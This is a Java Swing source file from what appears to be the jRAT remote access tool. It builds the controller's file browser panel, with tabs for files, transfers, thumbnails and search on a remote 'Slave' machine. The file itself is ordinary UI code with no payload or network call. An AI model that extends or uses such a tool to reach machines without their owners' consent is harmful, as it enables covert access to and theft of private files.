package jrat.module.fs.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.fs.ui.previews.PreviewPanel;

import javax.swing.*;
import java.awt.*;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings("serial")
public class PanelFileSystem extends ClientPanel {

    /**
     * All file previewing handlers
     */
    private final Map<Object, PreviewPanel> previewHandlers = new HashMap<>();

    private JTabbedPane tabbedPane;
	private PanelFileManager remoteFiles;
	private PanelSearchFiles searchPanel;
	private PanelThumbView thumbPanel;

	public PanelFileSystem(Slave slave) {
		super(slave, "File Browser", Resources.getIcon("folder-stand"));

		setLayout(new BorderLayout(0, 0));

		remoteFiles = new PanelFileManager(slave);
		searchPanel = new PanelSearchFiles(slave);
		thumbPanel = new PanelThumbView(slave);
		
		tabbedPane = new JTabbedPane();
		tabbedPane.addTab("Files", Resources.getIcon("folder-stand"), remoteFiles);
		tabbedPane.addTab("Transfers", Resources.getIcon("arrow-down"), PanelFileTransfers.instance);
		tabbedPane.addTab("Thumbnails", Resources.getIcon("images-stack"), thumbPanel);
		tabbedPane.addTab("Search", Resources.getIcon("folder-search"), searchPanel);

		for (Component c : tabbedPane.getComponents()) {
		    if (c instanceof ClientPanel) {
                ((ClientPanel) c).opened();
            }
        }
		
		add(tabbedPane, BorderLayout.CENTER);	
	}

    @Override
    public void dispose() {
        super.dispose();

        for (Component c : tabbedPane.getComponents()) {
            if (c instanceof ClientPanel) {
                ((ClientPanel) c).dispose();
            }
        }
    }

    /**
     *
     * @param key
     * @param preview
     */
	void addPreview(final Object key, final PreviewPanel preview) {
	    preview.addCloseListener(new PreviewPanel.CloseListener() {
            @Override
            public void close() {
                tabbedPane.remove(preview);
                previewHandlers.remove(key);
            }
        });
	    previewHandlers.put(key, preview);
	    tabbedPane.addTab(preview.title, preview.icon, preview);
    }

    public PreviewPanel getPreviewHandler(Object key) {
        return previewHandlers.get(key);
    }

    public PanelFileManager getFilesPanel() {
		return remoteFiles;
	}

	public PanelSearchFiles getSearchPanel() {
		return searchPanel;
	}
	
	public PanelThumbView getThumbPanel() {
		return thumbPanel;
	}
	
	public void setTab(Component tab) {
		tabbedPane.setSelectedComponent(tab);
	}

}
